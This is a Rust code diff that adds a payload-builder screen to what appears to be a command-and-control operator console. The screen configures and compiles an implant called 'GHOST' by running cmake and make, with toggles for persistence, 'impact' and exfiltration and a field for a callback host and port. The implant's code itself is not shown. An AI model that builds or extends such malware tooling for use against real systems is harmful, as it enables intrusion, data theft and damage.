@@ -2,6 +2,8 @@ use crate::client::{self, Ghost, Task};
 use crossterm::event::KeyCode;
 use ratatui::widgets::{ListState, TableState};
 use tokio::sync::mpsc;
+use std::process::Command;
+use std::path::Path;
 
 #[derive(PartialEq)]
 pub enum AppState {
@@ -10,6 +12,43 @@ pub enum AppState {
     Help,
     ActionMenu,
     ConfirmModal
+}
+
+#[derive(PartialEq, Clone, Copy)]
+pub enum BuilderField {
+    Url,
+    Port,
+    EnableDebug,
+    EnablePersistence,
+    EnableImpact,
+    EnableExfil,
+    Submit
+}
+
+pub struct BuilderState {
+    pub selection: BuilderField,
+    pub target_url: String,
+    pub target_port: String,
+    pub enable_debug: bool,
+    pub enable_persistence: bool,
+    pub enable_impact: bool,
+    pub enable_exfil: bool,
+    pub build_status: String
+}
+
+impl BuilderState {
+    fn new() -> Self {
+        Self {
+            selection: BuilderField::Url,
+            target_url: "127.0.0.1".to_string(),
+            target_port: "9999".to_string(),
+            enable_debug: true,
+            enable_persistence: true,
+            enable_impact: true,
+            enable_exfil: true,
+            build_status: "IDLE".to_string()
+        }
+    }
 }
 
 pub enum NetworkEvent {
@@ -65,6 +104,8 @@ pub struct App {
     pub network_tx: mpsc::Sender<NetworkEvent>,
     pub network_rx: mpsc::Receiver<NetworkEvent>,
 
+    pub builder: BuilderState,
+
     pub tick_count: u64
 }
 
@@ -86,6 +127,7 @@ impl App {
             status_message: "READY press \'h\' for help".to_string(),
             network_tx: tx,
             network_rx: rx,
+            builder: BuilderState::new(),
             tick_count: 0
         };
         
@@ -297,7 +339,7 @@ impl App {
                 0 => self.handle_dashboard_keys(key),
                 1 => self.handle_terminal_keys(key),
                 2 => self.handle_config_keys(key),
-                // 3 => self.handle_builder_keys(key),
+                3 => self.handle_builder_keys(key),
                 _ => {}
             }
         }
@@ -408,6 +450,58 @@ impl App {
         }
     }
 
+    pub fn handle_builder_keys(&mut self, key: KeyCode) {
+        match key {
+            KeyCode::Down | KeyCode::Tab => {
+                self.builder.selection = match self.builder.selection {
+                    BuilderField::Url => BuilderField::Port,
+                    BuilderField::Port => BuilderField::EnableDebug,
+                    BuilderField::EnableDebug => BuilderField::EnablePersistence,
+                    BuilderField::EnablePersistence => BuilderField::EnableImpact,
+                    BuilderField::EnableImpact => BuilderField::EnableExfil,
+                    BuilderField::EnableExfil => BuilderField::Submit,
+                    BuilderField::Submit => BuilderField::Url
+                }
+            },
+            KeyCode::Up => {
+                self.builder.selection = match self.builder.selection {
+                    BuilderField::Url => BuilderField::Submit,
+                    BuilderField::Port => BuilderField::Url,
+                    BuilderField::EnableDebug => BuilderField::Port,
+                    BuilderField::EnablePersistence => BuilderField::EnableDebug,
+                    BuilderField::EnableImpact => BuilderField::EnablePersistence,
+                    BuilderField::EnableExfil => BuilderField::EnableImpact,
+                    BuilderField::Submit => BuilderField::EnableExfil
+                }
+            },
+            KeyCode::Backspace => {
+                match self.builder.selection {
+                    BuilderField::Url => { self.builder.target_url.pop(); },
+                    BuilderField::Port => { self.builder.target_port.pop(); },
+                    _ => {}
+                }
+            },
+            KeyCode::Enter | KeyCode::Char(' ') => {
+                match self.builder.selection {
+                    BuilderField::EnableDebug => self.builder.enable_debug = !self.builder.enable_debug,
+                    BuilderField::EnablePersistence => self.builder.enable_persistence = !self.builder.enable_persistence,
+                    BuilderField::EnableImpact => self.builder.enable_impact = !self.builder.enable_impact,
+                    BuilderField::EnableExfil => self.builder.enable_exfil = !self.builder.enable_exfil,
+                    BuilderField::Submit => self.build_ghost(),
+                    _ => {}
+                }
+            },
+            KeyCode::Char(c) => {
+                match self.builder.selection {
+                    BuilderField::Url => self.builder.target_url.push(c),
+                    BuilderField::Port => if c.is_numeric() { self.builder.target_port.push(c); },
+                    _ => {}
+                }
+            }
+            _ => {}
+        }
+    }
+
     pub fn handle_input_mode(&mut self, key: crossterm::event::KeyEvent) {
         match key.code {
             KeyCode::Esc => self.state = AppState::Normal,
@@ -449,6 +543,63 @@ impl App {
             self.tasks.clear();
             self.refresh_tasks();
             self.should_scroll = true;
+        }
+    }
+
+    pub fn build_ghost(&mut self) {
+        self.builder.build_status = "BUILDING...".to_string();
+        self.status_message = "Building GHOST payload...".to_string();
+
+        let debug_flag = if self.builder.enable_debug { "ON" } else { "OFF" };
+        let persist_flag = if self.builder.enable_persistence { "ON" } else { "OFF" };
+        let impact_flag = if self.builder.enable_impact { "ON" } else { "OFF" };
+        let exfil_flag = if self.builder.enable_exfil { "ON" } else { "OFF" };
+
+        let ghost_path = Path::new("../GHOST");
+        let build_path = ghost_path.join("build");
+
+        if !ghost_path.exists() {
+            self.builder.build_status = "ERROR: ../GHOST not found".to_string();
+            return;
+        }
+
+        let _ = std::fs::create_dir_all(&build_path);
+        self.builder.build_status = "Created build directory".to_string();
+
+        let cmake_status = Command::new("cmake")
+            .current_dir(&build_path)
+            .arg("..")
+            .arg(format!("-DENABLE_DEBUG={}", debug_flag))
+            .arg(format!("-DENABLE_PERSISTENCE={}", persist_flag))
+            .arg(format!("-DENABLE_IMPACT={}", impact_flag))
+            .arg(format!("-DENABLE_EXFIL={}", exfil_flag))
+            .output();
+
+        match cmake_status {
+            Ok(output) if output.status.success() => {
+                let make_status = Command::new("make")
+                    .current_dir(&build_path)
+                    .output();
+                self.builder.build_status = "Started make".to_string();
+
+                match make_status {
+                    Ok(out) if out.status.success() => {
+                        self.builder.build_status = "SUCCESS: bin/Ghost".to_string();
+                        self.status_message = "Build successful".to_string();
+                    },
+                    _ => {
+                        self.builder.build_status = "ERROR: Make failed".to_string();
+                    }
+                }
+            },
+            Ok(output) => {
+                let err = String::from_utf8_lossy(&output.stderr);
+                self.builder.build_status = "ERROR: CMake failed".to_string();
+                self.status_message = format!("CMake error: {}", err);
+            },
+            Err(e) => {
+                self.builder.build_status = format!("ERROR: {}", e);
+            }
         }
     }
 }
